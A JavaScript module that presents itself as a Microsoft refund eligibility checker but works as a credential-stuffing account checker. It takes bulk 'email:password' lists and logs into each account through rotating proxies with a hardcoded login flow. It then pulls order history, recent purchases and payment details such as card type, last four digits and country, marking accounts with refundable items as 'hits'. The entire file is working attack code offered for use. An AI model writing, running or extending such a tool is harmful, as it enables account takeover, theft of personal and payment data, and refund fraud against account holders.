// ============================================================
//  Microsoft Refund Eligibility Checker — fixed flow
//  Uses the same proven login chain as the store puller, then exchanges
//  the session for a delegated MSCom token, and queries the order/payment
//  endpoints with WLID1.0 (which is what account.microsoft.com actually uses).
// ============================================================

const { proxiedFetch } = require("./proxy-manager");

const USER_AGENT =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0";
const REFUND_WINDOW_DAYS = 14;
const MAX_RETRIES = 2;
const RETRY_DELAY = 2000;

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

// ── Cookie Jar ──────────────────────────────────────────────

function extractCookies(res, jar) {
  const sc = res.headers.getSetCookie?.() || [];
  for (const c of sc) {
    const parts = c.split(";")[0].trim();
    const eq = parts.indexOf("=");
    if (eq > 0) jar[parts.substring(0, eq)] = parts.substring(eq + 1);
  }
}

function jarToString(jar) {
  return Object.entries(jar).map(([k, v]) => `${k}=${v}`).join("; ");
}

// ── Refund window helper ────────────────────────────────────

function isWithinRefundWindow(dateStr) {
  if (!dateStr) return { eligible: false, dt: null };
  const cleaned = String(dateStr).split("+")[0].split("Z")[0].substring(0, 26);
  const dt = new Date(cleaned);
  if (isNaN(dt.getTime())) return { eligible: false, dt: null };
  const diffDays = (Date.now() - dt.getTime()) / 86400000;
  return { eligible: diffDays <= REFUND_WINDOW_DAYS && diffDays >= 0, dt };
}

// ── Store login (same client_id as puller's loginMicrosoftStore) ──

async function loginAccountSession(email, password) {
  const headers = {
    "User-Agent": USER_AGENT,
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    Referer: "https://account.microsoft.com/",
    Origin: "https://account.microsoft.com",
    "Upgrade-Insecure-Requests": "1",
  };
  const jar = {};

  async function get(url, extra = {}) {
    const res = await proxiedFetch(url, {
      headers: { ...headers, ...extra, Cookie: jarToString(jar) },
      redirect: "follow",
    });
    extractCookies(res, jar);
    const text = await res.text();
    return { res, text };
  }

  async function post(url, body, extra = {}) {
    const res = await proxiedFetch(url, {
      method: "POST",
      headers: { ...headers, ...extra, Cookie: jarToString(jar) },
      body,
      redirect: "follow",
    });
    extractCookies(res, jar);
    const text = await res.text();
    return { res, text };
  }

  try {
    const bk = Math.floor(Date.now() / 1000);
    const loginUrl =
      `https://login.live.com/ppsecure/post.srf?username=${encodeURIComponent(email)}` +
      "&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7" +
      `&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=${bk}` +
      "&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none";

    const { text: loginText } = await post(
      loginUrl,
      new URLSearchParams({
        login: email,
        loginfmt: email,
        passwd: password,
        PPFT:
          "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$",
      }).toString(),
      { "Content-Type": "application/x-www-form-urlencoded" }
    );

    if (loginText.includes("Your account or password is incorrect") || loginText.includes("does not exist")) {
      return { ok: false, reason: "invalid" };
    }

    const cleaned = loginText.replace(/\\/g, "");
    const reurlMatch = cleaned.match(/replace\("([^"]+)"/);
    if (!reurlMatch) return { ok: false, reason: "no_redirect" };

    const { text: reresp } = await get(reurlMatch[1]);
    const actionMatch = reresp.match(/<form.*?action="(.*?)".*?>/);
    if (!actionMatch) return { ok: false, reason: "no_form" };

    const inputMatches = [...reresp.matchAll(/<input.*?name="(.*?)".*?value="(.*?)".*?>/g)];
    const formData = new URLSearchParams();
    for (const m of inputMatches) formData.append(m[1], m[2]);

    await post(actionMatch[1], formData.toString(), {
      "Content-Type": "application/x-www-form-urlencoded",
    });

    return { ok: true, jar, headers };
  } catch (err) {
    return { ok: false, reason: err.message };
  }
}

// ── MS Account delegated token (used by buynow & purchase APIs) ──

async function getMSComToken(jar, headers) {
  try {
    await proxiedFetch("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", {
      headers: { ...headers, Cookie: jarToString(jar) },
    }).catch(() => {});

    const res = await proxiedFetch(
      "https://account.microsoft.com/auth/acquire-onbehalf-of-token?scopes=MSComServiceMBISSL",
      {
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          "X-Requested-With": "XMLHttpRequest",
          Referer: "https://account.microsoft.com/billing/orders",
          "User-Agent": USER_AGENT,
          Cookie: jarToString(jar),
        },
      }
    );
    if (res.status !== 200) return null;
    const data = await res.json();
    return data?.[0]?.token || null;
  } catch {
    return null;
  }
}

// ── Refund attempt ─────────────────────────────────────────

async function attemptCheck(email, password) {
  const result = {
    user: email, password,
    status: "fail", captures: {}, detail: "",
    refundable: [],
  };

  const login = await loginAccountSession(email, password);
  if (!login.ok) {
    if (login.reason === "invalid") { result.detail = "Invalid Credentials"; }
    else { result.status = "retry"; result.detail = login.reason || "login failed"; }
    return result;
  }

  const token = await getMSComToken(login.jar, login.headers);
  if (!token) { result.status = "fail"; result.detail = "Token failed"; return result; }

  const auth = `WLID1.0=t=${token}`;
  const cookieStr = jarToString(login.jar);

  const apiHeaders = {
    "User-Agent": USER_AGENT,
    Accept: "application/json",
    "Accept-Language": "en-US,en;q=0.9",
    Authorization: auth,
    "Content-Type": "application/json",
    Origin: "https://account.microsoft.com",
    Referer: "https://account.microsoft.com/billing/orders",
    Cookie: cookieStr,
  };

  const refundableItems = [];
  const seenKey = new Set();

  function pushItem(it) {
    const key = `${it.title}|${it.date}`;
    if (seenKey.has(key)) return;
    seenKey.add(key);
    refundableItems.push(it);
  }

  // Method 1: Order history (purchase.mp.microsoft.com v7)
  try {
    const r = await proxiedFetch(
      "https://purchase.mp.microsoft.com/v7.0/users/me/orders?market=US&language=en-US&lineItemStates=All&count=50&orderBy=Date",
      { headers: apiHeaders }
    );
    if (r.status === 200) {
      const j = await r.json().catch(() => ({}));
      const orders = j.items || j.orders || [];
      for (const o of orders) {
        const od = o.orderDate || o.creationDate || o.purchaseDate;
        const { eligible, dt } = isWithinRefundWindow(od);
        if (!eligible || !dt) continue;
        const items = Array.isArray(o.lineItems) ? o.lineItems : Array.isArray(o.items) ? o.items : [o];
        for (const it of items) {
          const refundState = String(it.refundState || it.refundEligibility || "").toLowerCase();
          if (refundState.includes("refunded")) continue;
          const title = it.productTitle || it.title || it.name || "Unknown Item";
          const amount = it.amount || it.totalPrice || it.listPrice || "";
          const currency = it.currencyCode || it.currency || "";
          pushItem({
            title,
            date: dt.toISOString().split("T")[0],
            type: it.productType || it.type || "Digital",
            amount: amount ? `${amount} ${currency}`.trim() : "N/A",
            days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
          });
        }
      }
    }
  } catch {}

  // Method 2: B2B order search (purchase.mp v8)
  try {
    const r = await proxiedFetch(
      "https://purchase.mp.microsoft.com/v8.0/b2b/orders/search?beneficiary=me&market=US&ordersState=All&pgSize=25",
      { headers: apiHeaders }
    );
    if (r.status === 200) {
      const j = await r.json().catch(() => ({}));
      const items = j.items || j.orders || [];
      for (const it of items) {
        const od = it.orderDate || it.creationDate || it.purchaseDate;
        const { eligible, dt } = isWithinRefundWindow(od);
        if (!eligible || !dt) continue;
        const title = it.productTitle || it.title || it.productName || "Unknown";
        const amount = it.totalPrice || it.amount || "";
        const currency = it.currencyCode || "";
        pushItem({
          title,
          date: dt.toISOString().split("T")[0],
          type: it.productType || "Digital",
          amount: amount ? `${amount} ${currency}`.trim() : "N/A",
          days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
        });
      }
    }
  } catch {}

  // Method 3: Subscription transactions (paymentinstruments)
  try {
    const r = await proxiedFetch(
      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
      { headers: apiHeaders }
    );
    if (r.status === 200) {
      const j = await r.json().catch(() => ({}));
      const subs = j.subscriptions || j.items || [];
      if (Array.isArray(subs)) {
        for (const s of subs) {
          const start = s.startDate || s.purchaseDate;
          const { eligible, dt } = isWithinRefundWindow(start);
          if (!eligible || !dt) continue;
          pushItem({
            title: s.title || s.description || "Subscription",
            date: dt.toISOString().split("T")[0],
            type: "Subscription",
            amount: `${s.totalAmount || s.amount || ""} ${s.currency || ""}`.trim(),
            days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
          });
        }
      }
    }
  } catch {}

  // Payment / country capture
  try {
    const r = await proxiedFetch(
      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
      { headers: apiHeaders }
    );
    if (r.status === 200) {
      const txt = await r.text();
      const country = txt.match(/"country"\s*:\s*"([^"]+)"/)?.[1];
      const last4 = txt.match(/"lastFourDigits"\s*:\s*"([^"]+)"/)?.[1];
      const ccName = txt.match(/"paymentMethodFamily"\s*:\s*"credit_card"\s*,\s*"display"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"/)?.[1];
      if (country) result.captures["Country"] = country;
      if (ccName || last4) result.captures["Payment"] = `${ccName || "Card"} ****${last4 || "????"}`.trim();
    }
  } catch {}

  result.refundable = refundableItems;
  if (refundableItems.length > 0) {
    result.status = "hit";
    const summary = refundableItems.slice(0, 5).map((i) => `${i.title} (${i.days_ago}d ago, ${i.amount})`);
    result.captures["Refundable"] = summary.join(" | ");
    result.captures["Total Refundable"] = String(refundableItems.length);
  } else {
    result.status = "free";
    result.captures["Refundable"] = "None found";
  }
  return result;
}

async function checkSingle(email, password) {
  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    const result = await attemptCheck(email, password);
    if (result.status === "retry") {
      if (attempt < MAX_RETRIES - 1) { await sleep(RETRY_DELAY * (attempt + 1)); continue; }
      result.status = "fail";
      result.detail = `retry exhausted (${result.detail})`;
    }
    return result;
  }
}

async function checkRefundAccounts(accounts, threads = 5, onProgress, signal) {
  const parsed = accounts.map((a) => {
    const i = a.indexOf(":");
    return i === -1 ? { email: a, password: "" } : { email: a.substring(0, i), password: a.substring(i + 1) };
  });

  const results = [];
  let idx = 0;

  async function worker() {
    while (true) {
      if (signal && signal.aborted) break;
      const current = idx++;
      if (current >= parsed.length) break;
      const { email, password } = parsed[current];
      if (!email || !password) {
        results.push({ user: email, password, status: "fail", captures: {}, detail: "invalid format", refundable: [] });
        if (onProgress) onProgress(results.length, parsed.length, "fail");
        continue;
      }
      const r = await checkSingle(email, password);
      results.push(r);
      if (onProgress) onProgress(results.length, parsed.length, r.status);
    }
  }

  const workerCount = Math.min(threads, parsed.length, 5);
  await Promise.all(Array(workerCount).fill(null).map(() => worker()));
  return results;
}

module.exports = { checkRefundAccounts };
